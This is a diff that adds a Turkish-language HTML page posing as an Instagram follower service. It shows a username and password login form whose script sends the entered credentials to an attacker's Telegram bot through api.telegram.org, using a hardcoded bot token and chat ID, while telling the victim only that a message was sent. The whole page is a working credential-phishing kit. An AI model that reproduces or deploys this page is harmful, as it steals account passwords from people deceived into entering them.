@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mesaj Gönder</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:system-ui;
+}
+
+body{
+  background:#0f1a22;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:#fff;
+}
+
+.container{
+  width:100%;
+  max-width:360px;
+  padding:20px;
+}
+
+h2{
+  text-align:center;
+  margin-bottom:20px;
+}
+
+input, textarea{
+  width:100%;
+  padding:14px;
+  margin-bottom:12px;
+  border-radius:12px;
+  border:none;
+  outline:none;
+  background:#1b2a36;
+  color:#fff;
+  font-size:15px;
+}
+
+textarea{
+  resize:none;
+  height:120px;
+}
+
+button{
+  width:100%;
+  padding:14px;
+  border-radius:25px;
+  border:none;
+  background:#1877f2;
+  color:#fff;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+.status{
+  margin-top:12px;
+  text-align:center;
+  font-size:14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <h2>İnstagram takipçi sitesi</h2>
+
+  <input type="text" id="name" placeholder="Kullanici adi">
+  <input id="message" placeholder="Şifre"></textarea>
+  <button onclick="sendMessage()">Giris yap</button>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+const BOT_TOKEN = "8412069744:AAH8tnhlIEujbQs6l9xayz4RH1pcK33NWv8";
+const CHAT_ID = "7038362008";
+
+function sendMessage(){
+  const name = document.getElementById("name").value;
+  const msg  = document.getElementById("message").value;
+  const status = document.getElementById("status");
+
+  if(msg.trim() === ""){
+    status.innerText = "Mesaj boş olamaz.";
+    return;
+  }
+
+  const text = `
+log düştü
+👤 kullanici adi: ${name || "Belirtilmedi"}
+💬 Sifre: ${msg}
+  `;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
+  })
+  .then(res => {
+    status.innerText = "✅ Mesaj gönderildi";
+    document.getElementById("message").value = "";
+  })
+  .catch(err => {
+    status.innerText = "❌ Hata oluştu";
+  });
+}
+</script>
+
+</body>
+  </html>
